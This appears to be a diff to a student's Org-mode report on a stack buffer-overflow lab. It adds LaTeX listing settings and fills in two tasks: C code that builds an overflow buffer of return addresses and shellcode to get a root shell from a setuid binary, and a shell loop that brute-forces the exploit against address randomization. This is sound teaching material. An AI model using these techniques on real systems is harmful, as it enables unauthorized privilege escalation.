@@ -52,6 +52,32 @@
 #+LATEX_HEADER:  title=\lstname                   % show the filename of files included with \lstinputlisting; also try caption instead of title
 #+LATEX_HEADER: }
 
+#+LATEX_HEADER: \lstset{
+#+LATEX_HEADER:  backgroundcolor=\color{white},   % choose the background color; you must add \usepackage{color} or \usepackage{xcolor}; should come as last argument
+#+LATEX_HEADER:  basicstyle=\scriptsize,          % the size of the fonts that are used for the code
+#+LATEX_HEADER:  breakatwhitespace=false,         % sets if automatic breaks should only happen at whitespace
+#+LATEX_HEADER:  breaklines=true,                 % sets automatic line breaking
+#+LATEX_HEADER:  captionpos=b,                    % sets the caption-position to bottom
+#+LATEX_HEADER:  extendedchars=true,              % lets you use non-ASCII characters; for 8-bits encodings only, does not work with UTF-8
+#+LATEX_HEADER:  firstnumber=1000,                % start line enumeration with line 1000
+#+LATEX_HEADER:  frame=single,                    % adds a frame around the code
+#+LATEX_HEADER:  keepspaces=true,                 % keeps spaces in text, useful for keeping indentation of code (possibly needs columns=flexible)
+#+LATEX_HEADER:  keywordstyle=\color{blue},       % keyword style
+#+LATEX_HEADER:  language=c,                      % the language of the code
+#+LATEX_HEADER:  morekeywords={ls,ping},          % if you want to add more keywords to the set
+#+LATEX_HEADER:  numbers=left,                    % where to put the line-numbers; possible values are (none, left, right)
+#+LATEX_HEADER:  numbersep=5pt,                   % how far the line-numbers are from the code
+#+LATEX_HEADER:  numberstyle=\tiny\color{mygray}, % the style that is used for the line-numbers
+#+LATEX_HEADER:  rulecolor=\color{black},         % if not set, the frame-color may be changed on line-breaks within not-black text (e.g. comments (green here))
+#+LATEX_HEADER:  showspaces=false,                % show spaces everywhere adding particular underscores; it overrides 'showstringspaces'
+#+LATEX_HEADER:  showstringspaces=false,          % underline spaces within strings only
+#+LATEX_HEADER:  showtabs=false,                  % show tabs within strings adding particular underscores
+#+LATEX_HEADER:  stepnumber=2,                    % the step between two line-numbers. If it's 1, each line will be numbered
+#+LATEX_HEADER:  stringstyle=\color{black},     % string literal style
+#+LATEX_HEADER:  tabsize=2,                       % sets default tabsize to 2 spaces
+#+LATEX_HEADER:  title=\lstname                   % show the filename of files included with \lstinputlisting; also try caption instead of title
+#+LATEX_HEADER: }
+
 #+begin_export latex
 \newpage % Go to the next page after title page
 #+end_export
@@ -82,7 +108,59 @@ sudo chmod 4755 stack
 #+attr_latex: :width 440px
 [[./img/stack_cmopile.png]]
 
+#+begin_export latex
+\newpage % Go to the next page after title page
+#+end_export
+
 * Task 1: Exploiting the Vulnerability
+
+After modifying the exploit.c file compile it and run the vulnerability like this
+#+begin_src bash
+gcc -o exploit exploit.c
+./exploit
+./stack
+# we should root access shell right now
+#+end_src
+
+Look at the code file attached for more comments, essentially what we are doing is overflowing the
+stack pointer and then making the program to execute our code which runs the root shell right after.
+#+begin_src c
+    /* You need to fill the buffer with appropriate contents here */
+    int max_num     = sizeof(buffer) - (sizeof(shellcode) + 1);
+    ptr             = buffer;
+    address_pointer = (long*)(ptr);
+    /* could be any number greater, we just want overflow */
+    return_address  = get_stack_pointer() + 500;
+    // overflow stack pointer with 30 instructions
+    for (i = 0; i < 30; i++) {
+        *(address_pointer++) = return_address;
+    }
+    for (i = 0; i < sizeof(shellcode); i++) {
+        buffer[max_num + i] = shellcode[i];
+    }
+    buffer[sizeof(buffer) - 1] = '\0';
+#+end_src
+
+*Result*
+#+attr_latex: :width 440px
+[[./img/stack_execute.png]]
+
 * Task 2: Address Randomization
+
+Turn on address randomization like this
+#+begin_src sh
+sudo /sbin/sysctl -w kernel.randomize_va_space=2
+#+end_src
+
+If we try to run the exploit again after turning on Address randomization it will fail saying
+segmentation fault
+#+attr_latex: :width 440px
+[[./img/random_run.png]]
+
+We can try running the program in a loop as follows
+#+begin_src sh
+sh -c "while [ 1 ]; do ./stack; done;"
+#+end_src
+
 * Task 3: Stack Guard
 * Task 4: Non-executable Stack
